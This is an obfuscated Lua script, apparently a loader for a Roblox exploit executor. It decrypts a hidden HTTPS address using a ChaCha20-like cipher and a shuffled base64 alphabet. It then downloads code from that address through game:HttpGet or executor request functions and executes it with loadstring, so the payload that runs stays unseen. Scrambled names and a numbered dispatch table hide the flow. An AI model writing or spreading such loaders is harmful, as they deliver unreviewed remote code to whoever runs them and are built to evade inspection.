local BmTqSRXZUQ=bit32
if type(BmTqSRXZUQ)~="table" or type(BmTqSRXZUQ.bxor)~="function" or type(BmTqSRXZUQ.lrotate)~="function" then error("Unsupported",0) end
local quqvKmxZz={1807407023,3405352545,2138077542,1073515396,2063574994,1856678161,1628725579,2984359133}
local pCQeCjsQJ={3809143156,2715336476,802599821,2311840037,441769760,1994072124,3780826318,2001014130}
local xaXvQbQ={3921081817,2957181175,1329391420,2834769397,1884473170,3782919024,2504492241,679691206}
local ncSMDVNwu={}
for i=1,8 do ncSMDVNwu[i]=BmTqSRXZUQ.bxor(BmTqSRXZUQ.bxor(quqvKmxZz[i],pCQeCjsQJ[i]),xaXvQbQ[i]) end
local jGkMjFw={2757622981,786259749,2793561941}
local xaZQcvA={"rq5hRnEVE","BvNDYtWhWDNWAHWI-","ajp50PHTGVOXj_Y3","heTBjXHVb2eNVEWUx5","Ae08Rc6Wy",".","ZikGTtScwhGhMm"}
local xsyNzBC={3,7,2,5,1,4,6}
local BsBbbSD=4294967296
local wXMhtQdC=math.floor
local function mJcgdwRH(v,a,b,c,d)
 v[a]=(v[a]+v[b])%BsBbbSD;v[d]=BmTqSRXZUQ.lrotate(BmTqSRXZUQ.bxor(v[d],v[a]),16)
 v[c]=(v[c]+v[d])%BsBbbSD;v[b]=BmTqSRXZUQ.lrotate(BmTqSRXZUQ.bxor(v[b],v[c]),12)
 v[a]=(v[a]+v[b])%BsBbbSD;v[d]=BmTqSRXZUQ.lrotate(BmTqSRXZUQ.bxor(v[d],v[a]),8)
 v[c]=(v[c]+v[d])%BsBbbSD;v[b]=BmTqSRXZUQ.lrotate(BmTqSRXZUQ.bxor(v[b],v[c]),7)
end
local function aVjbjGckA(counter)
 local v={1634760805,857760878,2036477234,1797285236,ncSMDVNwu[1],ncSMDVNwu[2],ncSMDVNwu[3],ncSMDVNwu[4],ncSMDVNwu[5],ncSMDVNwu[6],ncSMDVNwu[7],ncSMDVNwu[8],counter,jGkMjFw[1],jGkMjFw[2],jGkMjFw[3]}
 local w={}
 for i=1,16 do w[i]=v[i] end
 for _=1,10 do
  mJcgdwRH(w,1,5,9,13);mJcgdwRH(w,2,6,10,14);mJcgdwRH(w,3,7,11,15);mJcgdwRH(w,4,8,12,16)
  mJcgdwRH(w,1,6,11,16);mJcgdwRH(w,2,7,12,13);mJcgdwRH(w,3,8,9,14);mJcgdwRH(w,4,5,10,15)
 end
 local out={}
 for i=1,16 do
  local n=(w[i]+v[i])%BsBbbSD
  out[#out+1]=n%256;out[#out+1]=wXMhtQdC(n/256)%256;out[#out+1]=wXMhtQdC(n/65536)%256;out[#out+1]=wXMhtQdC(n/16777216)%256
 end
 return out
end
local function JVsJghWa()
 local joined={}
 for i=1,#xsyNzBC do joined[i]=xaZQcvA[xsyNzBC[i]] end
 local data=table.concat(joined)
 local alphabet="48v-dAxl5isXHTEIbSQec3thaWj1_rBOFJYu7RCKM0owkDNzVy296pqGZfnLmUPg"
 local lookup={}
 for i=1,#alphabet do lookup[string.byte(alphabet,i)]=i-1 end
 lookup[46]=0
 local decoded={}
 for p=1,#data,4 do
  local a,b,c,d=string.byte(data,p,p+3)
  if not d or lookup[a]==nil or lookup[b]==nil or lookup[c]==nil or lookup[d]==nil then error("Invalid",0) end
  local n=lookup[a]*262144+lookup[b]*4096+lookup[c]*64+lookup[d]
  decoded[#decoded+1]=wXMhtQdC(n/65536)%256
  if c~=46 then decoded[#decoded+1]=wXMhtQdC(n/256)%256 end
  if d~=46 then decoded[#decoded+1]=n%256 end
 end
 if #decoded~=62 then error("Invalid",0) end
 local output={}
 for off=1,#decoded,64 do
  local stream=aVjbjGckA(1+wXMhtQdC((off-1)/64))
  for j=1,math.min(64,#decoded-off+1) do
   output[#output+1]=string.char(BmTqSRXZUQ.bxor(decoded[off+j-1],stream[j]))
  end
 end
 local url=table.concat(output)
 if url:sub(1,8)~="https://" then error("Invalid",0) end
 return url
end
local function EcQtFFPABc(body)
 if type(body)~="string" or #body==0 or #body>8388608 then return nil end
 local loader=loadstring or load
 if type(loader)~="function" then return nil end
 local ok,fn=pcall(loader,body)
 if ok and type(fn)=="function" then return fn end
end
local function sjeURNv(req,url)
 if type(req)~="function" then return nil end
 local ok,res=pcall(req,{Url=url,Method="GET",Headers={Accept="text/plain"}})
 if not ok or type(res)~="table" then return nil end
 local status=tonumber(res.StatusCode or res.Status or res.status)
 if status~=200 and not(status==nil and res.Success==true) then return nil end
 return EcQtFFPABc(res.Body or res.body)
end
local zKPWgVEy={url=JVsJghWa()}
local thFfkHNby={}
thFfkHNby[36702]=function(z)
 local ok,body=pcall(function() return game:HttpGet(z.url,true) end)
 if ok then z.fn=EcQtFFPABc(body) end
 if z.fn then return 45160 else return 53096 end
end
thFfkHNby[53096]=function(z)
 local clients={}
 local function add(x) if type(x)=="function" then clients[#clients+1]=x end end
 add(request);add(http_request)
 if type(syn)=="table" then add(syn.request) end
 if type(http)=="table" then add(http.request) end
 local seen={}
 for _,req in ipairs(clients) do
  if type(req)=="function" and not seen[req] then
   seen[req]=true
   z.fn=sjeURNv(req,z.url)
   if z.fn then break end
  end
 end
 return 45160
end
thFfkHNby[45160]=function(z)
 if not z.fn then error("Unavailable",0) end
 return nil
end
local cRvCtCF=36702
for _=1,3 do
 if cRvCtCF==nil then break end
 cRvCtCF=thFfkHNby[cRvCtCF](zKPWgVEy)
end
if not zKPWgVEy.fn then error("Unavailable",0) end
return zKPWgVEy.fn()
